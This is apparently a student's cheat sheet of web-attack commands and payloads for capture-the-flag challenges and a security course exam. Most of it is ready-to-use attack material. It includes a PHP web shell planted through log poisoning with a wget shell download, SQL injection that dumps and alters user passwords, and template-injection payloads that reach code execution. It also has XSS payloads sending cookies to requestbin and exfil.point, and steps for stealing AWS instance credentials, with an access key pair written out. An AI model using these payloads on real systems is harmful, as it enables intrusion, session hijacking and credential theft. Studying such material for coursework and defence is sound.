# 6843 CMDS + PAYLOADS  
Copy pasta some commands + payloads for CTF-style challenges + COMP6843 final exam.

Automate your shit as much as possible because time is important + you dont have time to analyse every single request/response or do repetitive tasks.

Good cheat-sheets (if shit here doesn't work):
* https://github.com/w181496/Web-CTF-Cheatsheet

# Index

- [Security Setup](#security-setup) 
- [Common 6843 words](#common-6843-words)  
- [Recon](#recon)
- [Authentication / Session Management](#authentication-and-session-management)
- [Local / Remote File Inclusion](#local-and-remote-file-inclusion)
- [SQL Injection](#sql-injection)
- [Other / Advanced Injections](#other-and-advanced-injections)
- [XML External Entities](#xxe)
- [Cross-Site Scripting (XSS)](#xss)
- [Cross-Site Request Forgery (CSRF)](#cross---site-request-forgery)
- [Server-Side Request Forgery (SSRF)](#server---side-request-forgery)
- [PHP Serialization](#php-serialization)
- [Amazon Web Services SSRF](#amazon-web-services-ssrf)
- [REST APIs](#rest-apis)

# Content

---
### Security Setup
---

**EC2 Web Server**
1. Launch HTTP server `python -m SimpleHTTPServer 80`
2. Hit it with requests / capture some admin cookies :)

**Alternatives to capture requests**
* https://requestbin.fullcontact.com/
* http://webhookinbox.com/

---
### Common 6843 words
---
Port Numbers, Directories, Subdomains, Files... be imaginative.
```
noone
sketch / sketchy
sy
carey / cry
9447 / 6841 / 6441
robots.txt
flag
 /lol, /fuck, /1, /test, /sy
```
List of /etc/{blah} files (in case some strings are blacklisted e.g. "/etc/passwd")  
`https://www.tldp.org/LDP/sag/html/etc-fs.html`

---
### Recon
---

**Nslookup**
```
Reverse DNS query:
$ nslookup [ hostname/ip ]
```

**Nmap**  
```
Aggressive service/OS detection:
$ nmap -sV --version-intensity 5 [ hostname/ip ]

Scan all ports for the lolz:
$ nmap -p- [ hostname/ip ]
$ nmap -sT -vv -p 1-65535 [ hostname/ip ]

Scan most common ports (fast):
$ nmap -F [ hostname/ip ]

Increase Verbosity / Debugging:
$ nmap -vv OR -dd [ hostname/ip ]
```

**LEVEL 1: Aquatone**
```
$ aquatone-discover --domain [ ns.agency ]            // run subdomain bruteforcing
$ cat ~/aquatone/example.com/hosts.txt                // show discovered subdomains
```
**LEVEL 2: AltDNS**
```
$ ./altdns.py -i [ input.txt ] -o [ output.txt ] -w [ wordlist.txt ] -r -s [ valid_subdomains.txt ]

-i input.txt  => list of known subdomains.
-o output.txt => contain list of altered/permuted subdomains that have been tested.
-r            => resolves each subdomain
-w wordlist.txt => list of words that you would like to permute your current subdomains with.
```
**GoBuster DNS Mode**
```
$ go run main.go -m dns -u [ https://ns.agency ] -w /path/to/wordlist
```

**GoBuster Directory Mode**
```
$ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common.wordlist
````  

---
### Authentication and Session Management
---  

Observe:
* Cookie / Session Token values.
  * Base64 decode -> change values to admin etc. -> Base64 encode -> Profit.
* Page Source Code.
  * View Source -> Look for suspicious comments / sections in code -> Profit.

---
### Local and Remote File Inclusion
---  

STEP #1: Verify existence of LFI/LFD vulnerability.
```
domain.com/?p=somepage.txt
domain.com/?p=pagename-whatever
domain.com/?class=something&function=another 
```

STEP #2: Figure out where the logfiles are. Example locations:
```
// PHP Logfiles:
/usr/local/etc/php
/etc/php.d/*.ini
/etc/php5/cli/php.ini
/usr/local/lib/php.ini
/etc/php.ini
  
// Apache Logfiles:
/var/log/apache2/access.log
/var/log/httpd/error_log
/var/log/apache2/error.log
/var/log/httpd-error.log
```

STEP #3: Inject a payload into the logfile:

  * _PHP passthru() function_: Execute an external program and display raw output
  * Attack vectors:
     * URL query string: `example.com/?q=injectpaylod`
     * HTTP Headers: Referer header.
```
$ <?php passthru($_GET['cmd']); ?>
$ <?php passthru(['ls -l']); ?>
```

STEP #4: With command execution, use wget to upload your own files to the server:
```
$ /var/log/apache2/access.log&cmd=wget http://somedomain.com/shellfile.php
OR
$ <?php passthru(['w']); ?>
```

Other things to try:
```
php://filter | php://input | php://expect
./index.php | ././index.php | .//index.php
../../../../../../etc/passwd | %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
/etc/nginx/conf.d/default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default.conf
.htaccess
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
```

Windows LFI:
```
C:/Windows/win.ini
C:/boot.ini
C:/apache/logs/access.log
../../../../../../../../../boot.ini/....................... and so on
C:/windows/system32/drivers/etc/hosts
```

Another LFI / LFI->RCE Cheatsheet:  
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal

---
### SQL Injection
---  
SQL Cheatsheet: http://www.cheat-sheets.org/sites/sql.su/  
DB Specific SQLi Cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targetsite.com/price.php?id=1+1`

DB fingerprinting techniques:
```sql
/* MySQL */                                                        -- FINGERPRINTING:        
   http://www.example.com/news.php?id=1 /*! AND 1=1 */--           -- via. comments
   http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')   -- via. MySQL CONCAT()
   http://www.example.com/news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  -- via. db version

/* Postgres */
   http://www.example.com/news.php?id=1 AND 1=1::int               -- via. typecast
   http://www.example.com/news.php? id=1 AND 'a'='a'||'a'          -- via. Postgres concat
   http://www.example.com/news.php? id=1
   SELECT version()                                                -- via. db version

/* If !MySQL and !Postgres, most likely SQLite: */
   http://www.sqlitetutorial.net/sqlite-cheat-sheet   OR
   https://d17h27t6h515a5.cloudfront.net/topher/2016/September/57ed880e_sql-sqlite-commands-cheat-sheet/sql-sqlite-commands-cheat-sheet.pdf
```

Enumerate DB metadata via. views:
```sql
/* MySQL (db.information_schema) */
  SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
  SELECT * FROM INFORMATION_SCHEMA.TABLES;
  
/* Sqlite (db.sqlite_master) */
  SELECT name FROM sqlite_master WHERE type='table';
```

Authentication Bypass:
```sql
/* Auth Form Bypass Example: */
  SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
  [user_field]’ OR 1=1; /*
  [pass_field]*/--
  
/* Other things try */
  admin' --
  ' or 1=1-- 
  ' or '1'='1
  ' or '1'='1 -- 
```

Blind SQLi (Boolean / Time-based)
```sql
%' AND 1=1 AND '%'='                  -- BOOLEAN: TRUE
%' AND 1=0 AND '%'='                  -- BOOLEAN: FALSE
company=sap%' AND SLEEP(5) AND '%'='  -- TIME-BASED   
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

UNION SELECT (exfiltrating data):
```sql
/* Dump db version + db name */
    ns.agency/stuff.php?id=3 order by 1                                  
    ns.agency/stuff.php?id=0' union select 1,version(),database()-- 
    
/* Dump usernames and passwords (MySQL) */
    -- list names of tables within the current database [result=emails, referers, uagents, users]
    ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()-- 
    -- list names of columns within the "users" table [result=id, username, password]
    ns.agency/stuff.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name="users"-- 
    -- list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
    ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users-- 
```

INSERT / UPDATE (adding or changing data):
```sql
/* Insert new users (MySQL) */
    -- insert a new row into the "users" table with values id=99, username=newuser, password=newpass
    ns.agency/stuff.php?id=0'; insert into users(id,username,password) values ('99','newuser','newpass');-- 

/* Update admin password (MySQL) */
    -- set password="1234" for a user called "admin"
    ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";-- 
```

Stacked Queries:
```
add stuff here
```

Sqlmap:
```shell
# Enumerate everything:
python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3

# Enumerate a specific database:
python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
```

Other things:
```
Read Files (MySQL)
   SELECT LOAD_FILE('/etc/passwd');

Logic Altneratives (bypass filters etc.)
   and -> &&
   or -> ||
   = -> like
   != -> not like
```

---
### Other and Advanced Injections
---

**Command Injection**
Examples:
```
http://shitesite/lol.php?path=cat%20/etc/passwd
http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
```  

Injection via. chaining:  
```shell
{original_cmd_by_server}; cat flag
{original_cmd_by_server} && cat flag
{original_cmd_by_server} | cat flag
{original_cmd_by_server} || cat flag    // Only if the first cmd fail
{original_cmd_by_server} %0a cat flag
{original_cmd_by_server} "; cat flag
{original_cmd_by_server} `cat flag`
{original_cmd_by_server} cat $(ls)
{original_cmd_by_server} "; cat $(ls)
```  
Execution inside another command:  
```shell
original_cmd_by_server `cat /etc/passwd`
original_cmd_by_server $(cat /etc/passwd)
```  

**Server-Side Template Injection (SSTI)**

Tool: https://github.com/epinna/tplmap

Working AngularJS payload (EXT BREAK #2):
```angular
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=5+5,new Image().src="http://requestbin.fullcontact.com/1b17hka1?asdf="+document.cookie,alert(2)');}}
```

Angular JS:
```angular
{{ 7*7 }} => 49
{{ this }}
{{ this.toString() }}
{{ constructor.toString() }}
{{ constructor.constructor('alert(1)')() }} 2.1 v1.0.1-v1.1.5
{{ a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')() }} 2.1 v1.0.1-v1.1.5
{{ toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor) }} 2.3 v1.2.19-v1.2.23
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}} v1.2.24-v1.2.29
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}} v1.3.20
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} v1.4.0-v1.4.9
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}} v1.5.0-v1.5.8
{{ [].pop.constructor('alert(1)')() }} 2.8 v1.6.0-1.6.6
```

Flask/Jinja:
```
Dump all used classes
  {{ ''.__class__.__mro__[2].__subclasses__() }}
Read File
  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
Write File
  {{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}
RCE
  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
evil config
  {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
load config
  {{ config['RUNCMD']('cat flag',shell=True) }}
```

---
### XXE
---  

XXE standard:  
* NOTE: "FILe" upper/lowercase mix was to bypass firewalls
* Use a valid XML feed, otherwise it will probably fail to parse. i.e. chuck `&xxe;` in legit xml elements in the feed.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
        <!ENTITY xxe SYSTEM "FILe:%2F%2F%2Fetc/hosts" >
]>
<element>&xxe;</element>
```

XXE Out-of-Bounds attack:
```

```

XML Parser/Filter Bypass:
_Example blacklisted keywords: [file://] [/etc] [passwd] or 2nd level XML docs included_
```

```

---
### XSS
---
**Useful JS web API methods for XSS**  
Redirect a user/admin to your url to steal their cookies.
```javascript
fetch()
window.onload()
document.location()
window.location.replace()
window.location.reload()
window.location.assign()
```

**Standard Payloads ad Filter Evasion**
```javascript
<script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
<script>document.write(“<img src=http://exfil.point/lol?”+document.cookie);</script>
```

**CSP Bypass**  
Bypass via. JSONP API callback param:
```javascript
//Verify:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=alert('xss');//"></script>

//Payload Original:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c='+document.cookie);//"></script>

//Payload Step #1 => Encode x1:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%3D'%2Bdocument.cookie);//"></script>

//Payload Step #2 => Encode x2:
<script src="https://cspdomain1.dev.ns.agency/api/weather/?weather=2149645&callback=window.location.replace('https://requestbin.fullcontact.com/1kmppe91?c%253D'%252Bdocument.cookie);//"></script>

Note:
- Encoding needs to be performed twice as the initial POST request to the target server will decode it once, then another round of decoding will be performed upon the target's callback to your attacker url.
```

---
### Cross-Site Request Forgery
---

---
### Server-Side Request Forgery
---
Summary: Attacker can make requests from a server to target a system's internals (i.e intranet) by bypassing its firewalls.

SSRF indicators:
* Look for network requests that may reference a localhost address: `https://ns.agency/static?r=http://127.0.0.1:[port]/flag.html` (inspect->network)
* Callback functions.
* Look for params that may reference internal services.
* Look for a search input box / any form input that may reference internal services.
* Look for redirects

File Protocol (access a server's file system)
```
file:///etc/passwd
file:///proc/self/cmdline
file:///proc/self/exe
file:///proc/self/environ
curl file:///etc/passwd
```

Other Protocols
```
gopher://127.0.0.1:3306/_<PAYLOAD>      // MySQL
gopher://127.0.0.1:9000                 // FastCGI
gopher://127.0.0.1:6379                 // Redis
ftp://127.0.0.1:20/21
dict://
telnet://127.0.0.1:23
smtp://127.0.0.1:25
jar://
```

Elastic Search APIs (default port:9200/9300):
```
http://0:9200/_search?q={flag, sectalks, 6443 . . .}
http://0:9200/_cluster/settings
http://0:9200/_cluster/state
http://0:9200/_tasks/
http://0:9200/_nodes?pretty=true
http://0:9200/_mapping
http://0:9200/_cat&?pretty=true
http://0:9200/phrack/article/14
```

PHP:
```php
file_get_contents()
fsockopen()
curl_exec()
```

Bypass 'localhost' filters:
```
http://{localhost_variation}
127.0.0.1
192.168.1.1
Localhost
lOcAlHoSt
0
http://0177.1/
http://0x7f.1/
http://127.000.000.1
```

CLRF injection in HTTP header:
```
Carriage Return (\r) or Line Feed (\n) terminates a line of HTTP request.

// Attacker's request:
GET ?url=http://example.com/%0d%0aRefeerer:localhost
Host:www.target.com

// Server's request
GET http://example.com
Referer:localhost
```

---
### PHP Serialisation
---

PHP Magic Methods:
* `construct()`: Object is called when new, but unserialize() is not called
* `destruct()`: Called when the Object is destroyed
* `wakeup()`: Called automatically when unserialize
* `sleep()`: Called when serialize
* `toString()`: When the object is called as a string

---
### Amazon Web Services SSRF
---

Confirm SSRF with `http://169.254.169.254` as the payload.

Typical Steps:
1. Find info / dump data in AWS instance.
```
http://169.254.169.254/latest/meta-data/iam/info   // Find an IAM role with access to the AWS resources.
http://169.254.169.254/latest/user-data
```
2. Find AWS Access Keys.
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/{EC2_instance_role}

Info retrieved should contain:
    * AccessKeyId: { access key ID }
    * SecretAccessKey: { secret access key }
    * Token { session token }
    * Expiration { expiry information }
```
4. Go to `~/.aws/credentials` and add in:
```
aws_access_key_id = ASIAJMCBEBJIIGUWFBMA
aws_secret_access_key = sU0fWBEQj2G0pWLz5phfA5qTD7Q3wg19FpAtVC4f
aws_session_token = {really long access token string}

You can also configure AWS keys via:
$ aws configure
```

5. Enumerate s3 bucket content: `aws s3 ls s3://ns.agency`  

6. Dump a flag or file content to stdout or download it
```
$ aws s3 cp s3://ns.agency/flag -    // dump to stdout
$ aws s3 cp s3://ns.agency/flag .    // download to current working dir
```

Alternatively, leak AWS Access Keys via. Local File Disclosure or similar vuln:
```
LFD => $ /docker-entrypoint.sh /init.sh ~/.aws/credentials.json
    OR $ cat ~/.aws/credentials
```

More info on AWS testing: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3
More info on exploiting AWS post-compromise: https://danielgrzelak.com/exploring-an-aws-account-after-pwning-it-ff629c2aae39

---
### REST APIs
---

**Common Findings / Things to look out for:**

Cookie / Session Token:
* Decode base64, may reveal sensitive information
* Check token expiry, token re-use, predictability.

Insecure Direct Object Referencing
* Changing ID / param values in the request to access/change/delete unintended resources.
* E.g. FB API vulnerability: `DELETE /<commend id>` to remove any user's comments.

Check for Privilege Escalation:
* Check Access Controls DELETE / PUT methods.

SQL injection / XSS
* Injection queries/javascript into requests to API endpoints.

Test request/response media types:
* `Accept` header: The media type(s) that the client tells the server it can understand.  
* `Content-Type` header: The media type(s) that the server tells the client what the response content actually is.



